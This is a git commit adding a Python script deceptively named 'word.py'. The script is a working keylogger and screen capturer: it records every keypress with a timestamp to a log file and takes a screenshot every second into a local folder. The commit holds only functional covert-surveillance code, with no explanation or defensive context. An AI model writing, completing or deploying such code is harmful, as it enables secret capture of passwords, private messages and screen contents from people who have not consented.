4226fcfd6408e7e1382bbff9ccc59f644a28945c
Yatin R Obili <54450440+yatinobili@users.noreply.github.com>
2020-10-17 02:02:23 -0500

    Add files via upload

---
+++ word.py
@@ -0,0 +1,44 @@
+# nihil#7777
+import time
+import os
+from threading import Timer, Thread
+from mss import mss
+from pynput.keyboard import Listener
+
+
+
+class IntervalTimer(Timer):
+    def run(self):
+        while not self.finished.wait(self.interval):
+            self.function(*self.args, **self.kwargs)
+
+
+class Monitor:
+
+    def _on_press(self, k):
+        with open('./logs/keylogs/log.txt', 'a') as f:
+            f.write('{}\t\t{}\n'.format(k, time.time()))
+
+    def _build_logs(self):
+        if not os.path.exists('./logs'):
+            os.mkdir('./logs')
+            os.mkdir('./logs/screenshots')
+            os.mkdir('./logs/keylogs')
+
+    def _keylogger(self):
+        with Listener(on_press=self._on_press) as listener:
+            listener.join()
+    def _screenshot(self):
+        sct = mss()
+        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))
+
+    def run(self, interval=1):
+
+        self._build_logs()
+        Thread(target=self._keylogger).start()
+        IntervalTimer(interval, self._screenshot).start()
+
+
+if __name__ == '__main__':
+    mon = Monitor()
+    mon.run()
